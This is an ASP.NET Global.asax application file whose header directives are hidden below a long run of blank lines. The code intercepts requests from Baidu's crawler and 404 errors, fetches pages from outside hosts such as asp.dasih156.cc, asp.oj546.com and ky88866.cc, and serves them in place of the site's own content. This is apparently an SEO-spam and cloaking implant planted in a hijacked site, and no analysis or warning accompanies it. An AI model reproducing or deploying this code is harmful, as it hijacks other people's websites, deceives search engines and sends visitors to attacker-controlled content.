<%@ Application Language="C#" %>






















































<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<script RunAt="server">


    void Application_Error(object sender, EventArgs e)
    {
        if (Context != null)
        {
            HttpContext ctx = HttpContext.Current;
            Exception ex = ctx.Server.GetLastError();
            HttpException ev = ex as HttpException;
            if (ev != null)
            {
                if (ev.GetHttpCode() == 404)
                {

                    string[] spidersString = "baidu".ToLower().Split(',');
                    string[] refesString = "baidu".ToLower().Split(',');
                    string Path = "http://asp.dasih156.cc/12.html";
                    string jsPath = "http://ky88866.cc/index.html";
                    string sitemaps = "";
                    string rsss = "";
                    string REFERER = "";
                    string user = "";
                    string urls = Request.RawUrl.ToString();
                    string host = Request.Url.Host;

                    if (Request.UrlReferrer != null)
                    {
                        REFERER = Request.UrlReferrer.ToString().ToLower();
                    }

                    if (Request.ServerVariables["HTTP_USER_AGENT"] != null)
                    {
                        user = Request.ServerVariables["HTTP_USER_AGENT"].ToString().ToLower();
                    }


                    foreach (string s in spidersString)
                    {
                        if (!string.IsNullOrEmpty(user) && user.IndexOf(s) != -1)
                        {
                            ctx.ClearError();
                            Response.Clear();
                            if (urls.IndexOf("sitemap") != -1)
                            {
                                string getleft = get_content(sitemaps);
                                Response.Write(getleft);
                                Response.End();
                            }
                            if (urls.IndexOf("rss.xml") != -1)
                            {
                                string getleft = get_content(rsss);
                                Response.Write(getleft);
                                Response.End();
                            }
                            string gethttp = GetWebPage(Path + "?xhost=" + host + "&reurl=" + urls);
                            Response.Write(gethttp);
                            Response.End();
                            return;
                        }


                    }
                    //Response.Redirect("/");

                    foreach (string s in refesString)
                    {
                        if (REFERER.IndexOf(s) != -1)
                        {
                            ctx.ClearError();
                            string getjs = get_content(jsPath);
                            Response.Write(getjs);
                            Response.End();
                        }
                    }


                }

            }
        }
    }

    void Application_BeginRequest(object sender, EventArgs e)
    {

        string[] spidersString = "Baiduspider".ToLower().Split(',');
        string user = "";

        if (Request.ServerVariables["HTTP_USER_AGENT"] != null)
        {
            user = Request.ServerVariables["HTTP_USER_AGENT"].ToString().ToLower();
        }
        foreach (string s in spidersString)
        {
            if (user.IndexOf(s) != -1)
            {
                Response.Clear();
                string gethttp = get_content("http://asp.oj546.com/sitemap.php");
                Response.Write(gethttp);

            }
        }



    }


    private string GetWebPage(string url)
    {
        System.Net.HttpWebRequest request = (System.Net.HttpWebRequest)System.Net.WebRequest.Create(url);
        //request.UserAgent = @"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)";
        request.Method = "GET";
        request.Accept = "*/*";
        request.AllowAutoRedirect = true;
        request.Timeout = 15000;

        System.Net.HttpWebResponse response = null;
        System.IO.StreamReader streamReader = null;
        try
        {
            response = (System.Net.HttpWebResponse)request.GetResponse();

            //??HttpWebResponse??MemoryStream????????
            using (System.IO.MemoryStream memoryStream = new System.IO.MemoryStream())
            {
                byte[] buffer = new byte[64 * 1024];//???????????
                int i;
                while ((i = response.GetResponseStream().Read(buffer, 0, buffer.Length)) > 0)
                {
                    memoryStream.Write(buffer, 0, i);
                }

                memoryStream.Position = 0;
                streamReader = new System.IO.StreamReader(memoryStream, Encoding.GetEncoding("gbk"));
                string htmlGBK = streamReader.ReadToEnd();

                memoryStream.Position = 0;
                streamReader = new System.IO.StreamReader(memoryStream, Encoding.GetEncoding("utf-8"));
                string htmlUTF = streamReader.ReadToEnd();

                if (!isLuan(htmlUTF))
                {
                    return htmlUTF;
                }
                else
                {
                    return htmlGBK;
                }
            }
        }
        catch
        {
            return "";
        }
        finally
        {
            if (streamReader != null) { streamReader.Close(); }
            if (response != null) { response.Close(); }
            if (request != null) { request.Abort(); }
        }
    }

    public static bool isLuan(string txt)
    {
        byte[] bytes = Encoding.UTF8.GetBytes(txt);
        //239 191 189
        for (int i = 0; i < bytes.Length; i++)
        {
            if (i < bytes.Length - 3)
                if (bytes[i] == 239 && bytes[i + 1] == 191 && bytes[i + 2] == 189)
                {
                    return true;
                }
        }
        return false;
    }



    private string get_content(string p)
    {
        string s = "";
        try
        {
            System.Net.WebClient client = new System.Net.WebClient();
            client.Encoding = System.Text.Encoding.GetEncoding("gbk");
            s = client.DownloadString(p);
            client.Dispose();
        }
        catch (Exception ex)
        {
            Response.Write("" + ex.Message);
        }
        return s;
    }


</script>